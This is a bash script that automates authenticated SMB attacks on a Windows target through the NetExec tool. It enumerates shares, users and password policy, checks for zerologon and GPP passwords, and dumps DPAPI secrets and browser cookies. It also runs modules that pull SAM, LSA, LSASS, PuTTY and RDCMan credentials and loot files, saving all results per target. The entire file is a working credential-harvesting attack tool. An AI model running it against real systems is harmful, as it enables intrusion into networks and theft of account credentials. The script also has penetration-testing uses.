#!/usr/bin/env bash
# Author: strikoder
# File: auth_smb.sh
# Usage: ./auth_smb.sh -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>] [--local-auth]
set -euo pipefail

IP=""; USER=""; PASS=""; DOMAIN=""; LOCAL=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t) IP="$2"; shift 2 ;;
    -u) USER="$2"; shift 2 ;;
    -p) PASS="$2"; shift 2 ;;
    -d) DOMAIN="$2"; shift 2 ;;
    --local-auth) LOCAL="--local-auth"; shift ;;
    *) echo "Usage: $0 -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>] [--local-auth]"; exit 1 ;;
  esac
done
[[ -z "$IP" || -z "$USER" || -z "$PASS" ]] && { echo "Missing -t/-u/-p"; exit 1; }
command -v nxc >/dev/null || { echo "nxc not in PATH"; exit 1; }

TS="$(date +%F_%H-%M-%S)"
OUT="results_auth/${IP}_${TS}"
mkdir -p "$OUT"
log(){ echo -e "[*] $*"; }

# Collect help & module list once
HELP="$(nxc smb -h 2>&1 || true)"
MODULES="$(nxc smb -L 2>/dev/null || true)"

have_flag(){ grep -q -- "$1" <<<"$HELP"; }
have_mod(){ grep -q -E "^\s*-$1\s" <<<"$MODULES"; }   # nxc lists as: -modname  description

base=()
[[ -n "$DOMAIN" ]] && base+=(-d "$DOMAIN")
[[ -n "$LOCAL"  ]] && base+=("$LOCAL")
base+=( -u "$USER" -p "$PASS" )

log "Running base recon"
FLAGS=()
for f in --shares --users --groups --pass-pol --loggedon-users --qwinsta --wdigest --gpp-password --zerologon; do
  have_flag "$f" && FLAGS+=("$f")
done
# run base probes (auto-filtered)
nxc smb "$IP" "${base[@]}" "${FLAGS[@]}" 2>&1 | tee "$OUT/nxc_base.txt" || true

log "Running DPAPI variants"
# dpapi (global), cookies, nosystem, local-auth+nosystem if requested
if have_flag "--dpapi"; then
  nxc smb "$IP" "${base[@]}" --dpapi                2>&1 | tee "$OUT/nxc_dpapi.txt"          || true
  nxc smb "$IP" "${base[@]}" --dpapi cookies        2>&1 | tee "$OUT/nxc_dpapi_cookies.txt"  || true
  nxc smb "$IP" "${base[@]}" --dpapi nosystem       2>&1 | tee "$OUT/nxc_dpapi_nosys.txt"    || true
  # If caller passed --local-auth we already included it in base[]. This line shows explicit local-auth+nosystem combo:
  nxc smb "$IP" "${base[@]}" --dpapi nosystem       2>&1 | tee "$OUT/nxc_dpapi_local_nosys.txt" || true
fi

log "Running modules (auto-detected)"
# Priv notes:
#  - spider_plus: file spider/loot after auth
#  - sam: needs local admin (or SeBackupPrivilege via backup_operator approach)
#  - lsa/lsass/putty: need local admin; lsass often uses procdump/lsassy (depends on build)
#  - backup_operator: works if token has SeBackupPrivilege (not full admin)
#  - ldapi: needs local admin; use --local-auth for local accounts
#  - rdcman: loot RDCMan creds/files if present
mods=( spider_plus sam lsa lsass putty backup_operator ldapi rdcman )
for m in "${mods[@]}"; do
  if have_mod "$m"; then
    log "nxc -M $m"
    nxc smb "$IP" "${base[@]}" -M "$m" 2>&1 | tee "$OUT/mod_${m}.txt" || true
  fi
done

log "Done. Results -> $OUT"

# Quick tips printed at end
cat <<'EOT' > "$OUT/READ_ME.txt"
Notes:
- SAM/LSA/LSASS/PUTTY/LDAPi modules generally require local admin; use --local-auth if creds are local account.
- backup_operator module leverages SeBackupPrivilege (no full admin needed).
- spider_plus can pull interesting files post-auth (paths depend on target).
- Use domain with -d if creds are domain accounts; omit and add --local-auth for local users.
EOT
